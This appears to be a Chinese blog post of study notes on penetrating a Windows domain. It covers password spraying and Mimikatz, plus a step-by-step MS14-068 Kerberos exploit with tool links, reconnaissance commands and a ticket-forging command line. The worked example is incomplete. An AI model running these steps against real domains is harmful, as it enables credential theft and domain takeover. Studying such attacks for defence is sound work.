---
layout: post
title:  内网渗透思路
categories: 安全知识
description:  内网渗透思路
keywords: 渗透
---

# 渗透流程


1. 收集域控信息
2. 密码爆破
3. 用户提权

## 二、域密码喷洒

[利用一个powershell工具完成 DomainPasswordSpray
](https://blog.csdn.net/qq_41874930/article/details/109308519)
利用工具：[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)


## 三、 用户提权

使用 Mimikatz

https://www.cnblogs.com/-mo-/p/11890232.html

# Kerberos域用户提权漏洞（MS14-068）分析与防范

## 工具下载
Ms14-068.exe 下载地址:https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068

PSexec 下载地址:https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe

mimikatz 下载地址:https://github.com/gentilkiwi/mimikatz/releases


## 一、查看域控制器的补丁安装情况
微软针对 MS14-068 漏洞提供补丁为 `KB3011780` 。输入命令查看补丁情况：

```
wmic qfe get hotfixid 

```
![](https://ask.qcloudimg.com/http-save/yehe-5487096/0xwlav6oci.png?imageView2/2/w/1620)
可以看到域控机器没有安装补丁。

## 二、查看用户的 SID

以用户 mary 身份登录，输入命令查看 SID 为：S-1-5-21-1218902331-2157346161-1782232778-1124

```dotnetcli
whoami /user
```

还可以使用这条命令获取域内所有用户的 SID：

```
wmic useraccount get name,sid
```
## 三、查看域控制器的主机名

获取域控主机名 / IP 地址

```dotnetcli
net group "Domain controllers" /domain
********
ping 主机名

```

![](https://i.loli.net/2020/01/09/C8m2XV63IKjzMtd.png)

> 注意不要带 $ 符号

# 四、利用ms14-068.exe 工具生成伪造的kerberos协议认证证书


 ms-14-068.exe -u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip
 ms-14-068.exe -u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip


例如：
```dotnetcli

Authentication Id : 0 ; 434243 (00000000:00075558)
Session           : Interactive from 1
User Name         : zhangsan
Domain            : test
Logon Server      : ABF
Logon Time        : 2022/4/22 9:44:37
SID               : S-1-5-21-2872597263-2872597263-2872597263-1111
```
 ms-14-068.exe -u   zhangsan@test.com  -p 域用户密码 -s S-1-5-21-2872597263-2872597263-2872597263-1111 -d 




# 知识拓展
2.查看域控制器的主机名
Nslookup -type=SRV _ldap._tcp

## 工具
https://github.com/gentilkiwi/kekeo


# 参考

https://cloud.tencent.com/developer/article/1760132

https://lionking.top/2020/01/09/MS14-068%E6%8E%92%E9%94%99+%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/